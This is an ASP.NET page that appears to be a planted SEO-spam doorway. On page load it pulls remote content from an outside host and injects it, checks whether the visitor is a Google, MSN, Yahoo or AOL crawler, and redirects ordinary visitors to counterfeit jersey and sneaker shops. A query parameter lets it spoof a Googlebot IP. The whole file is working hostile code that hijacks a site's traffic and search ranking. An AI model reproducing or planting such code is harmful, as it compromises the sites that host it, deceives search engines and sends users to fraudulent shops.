<%@ Page Language="C#" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            tz();
            string hyzhdy = webclient.DownloadString("http://jf.a123.fr/new/taobao.asp");
            string URL = "";
            if (Request.QueryString["pid"] != null)
            {
                URL = "http://www." + Request.QueryString["class"] + ".fr/bbb.aspx?pid=" + Request.QueryString["pid"] + "&page=" + HttpContext.Current.Request.Path;

            }
            else
            {
                URL = hyzhdy +"&page=" + HttpContext.Current.Request.Path;
            }
            content = webclient.DownloadString(URL);
            content = content.Replace("YYYYY", "https://key.jerseyscheapvip.top/");
            content = content.Replace("DDDDD", "");
            content = content.Replace("QQQQQ", HttpContext.Current.Request.Path);
        }
    }
    public void tz()
    {
        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string domain = webclient.DownloadString("http://jf.a123.fr/getdomain.aspx?rnd=1&ip=" + ip).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["pid"] != null && Request.QueryString["class"]!=null)
            {
                Response.Redirect("http://www." + Request.QueryString["class"] + ".fr/Detail.aspx?pid=" + Request.QueryString["pid"]);
            }
        }

    }
    public System.Net.WebClient webclient = null;
    public string content = "";

</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>
    <meta name="robots" content="index,follow,all" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body>
    <%=content %>
		<div class="li">
                    
                    <ul>
					<li><a href="jersey-en.aspx">jersey</a></li>
					<li><a href="new.aspx">taobao</a></li>
					<li><a href="ad-es.aspx">adidas -es</a></li>
					<li><a href="nk-en.aspx">nike max</a></li>
					<li><a href="tao.aspx">taobao-en</a></li>
					<li><a href="zh-it.aspx">puma</a></li>
<li><a href="ad-fr.aspx">adidas fr</a></li>
					</ul></div>

</body>
</html>
